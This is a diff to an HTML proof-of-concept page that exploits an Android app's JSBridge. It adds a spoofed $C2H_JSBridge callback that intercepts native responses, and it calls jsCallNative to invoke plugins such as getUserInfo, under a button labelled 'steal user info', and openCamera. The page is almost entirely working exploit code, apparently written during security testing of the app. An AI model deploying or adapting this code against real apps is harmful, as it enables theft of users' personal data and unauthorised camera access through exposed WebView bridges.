@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSBridge 漏洞利用 PoC (最终修正版)</title>
+    <title>JSBridge 漏洞利用 PoC (终极版)</title>
     <style>
         body { font-family: sans-serif; padding: 20px; max-width: 600px; }
-        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 4px; }
-        button:hover { background-color: #218838; }
+        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; }
+        button:hover { background-color: #0056b3; }
         #log { margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px; white-space: pre-wrap; font-family: monospace; }
         .success { color: #28a745; }
         .error { color: #dc3545; }
@@ -17,6 +17,7 @@
 <body>
     <h1>JSBridge 漏洞利用 PoC</h1>
     <button onclick="testGetUserInfo()">窃取用户信息</button>
+    <button onclick="testOpenCamera()">打开相机</button>
     <button onclick="clearLog()">清空日志</button>
     
     <div id="log">等待操作...</div>
@@ -58,25 +59,45 @@
             }
         }
 
-        // 【核心修正】使用 H2C_JSBridge 方法进行调用
+        // 【核心解决方案】创建一个“伪装者”，来拦截 XFB 风格的回调
+        // 根据反编译代码，XFB 回调通过 window.$C2H_JSBridge 执行
+        window.$C2H_JSBridge = function(cbID, data) {
+            console.log(">>> [vConsole] $C2H_JSBridge 伪装者被触发! <<<");
+            console.log(">>> [vConsole] cbID:", cbID);
+            console.log(">>> [vConsole] data:", data);
+
+            log(`--- $C2C_JSBridge 伪装者被触发 ---`);
+            log(`拦截到 cbID: ${cbID}, 数据: ${data}`);
+            
+            // 因为我们调用 jsCallNative 时传的 cbID 是 'nativeCallback'
+            // 所以这里 cbID 的值就是 'nativeCallback'
+            // 我们直接调用我们真正的处理函数
+            if (cbID === 'nativeCallback') {
+                nativeCallback(data);
+            } else {
+                log(`收到未知 cbID: ${cbID}`, 'error');
+            }
+        };
+
+
+        // 【核心】使用 jsCallNative 方法进行调用
         function callPlugin(pluginName, params) {
-            if (!window.Android || !window.Android.H2C_JSBridge) {
-                log('❌ window.Android.H2C_JSBridge 不存在', 'error');
+            if (!window.Android || !window.Android.jsCallNative) {
+                log('❌ window.Android.jsCallNative 不存在', 'error');
                 return;
             }
             
             log(`\n--- 调用插件: ${pluginName} ---`);
             
             try {
-                // 构造符合 H2C_JSBridge 要求的 JSON 字符串
                 const payload = {
-                    name: pluginName, // H2C_JSBridge 解析的是 "name"
-                    param: params || {} // H2C_JSBridge 解析的是 "param"
+                    method: pluginName,
+                    data: params || {}
                 };
                 console.log(">>> [vConsole] 准备发送 payload:", JSON.stringify(payload));
                 
-                // 第二个参数是回调函数名
-                window.Android.H2C_JSBridge(JSON.stringify(payload), 'nativeCallback');
+                // 第二个参数 'nativeCallback' 会被当作 cbID 传递
+                window.Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
                 log('✅ 已发起调用，等待回调...');
             } catch (e) {
                 log(`❌ 调用失败: ${e.message}`, 'error');
@@ -88,8 +109,15 @@
             callPlugin('getUserInfo');
         }
 
+        function testOpenCamera() {
+            clearLog();
+            callPlugin('openCamera');
+        }
+        
+        // 页面加载时自动扫描
         window.onload = () => {
             log('页面加载完成，点击按钮开始测试');
+            log('已创建 $C2H_JSBridge 伪装者，准备拦截回调...');
         };
     </script>
 </body>
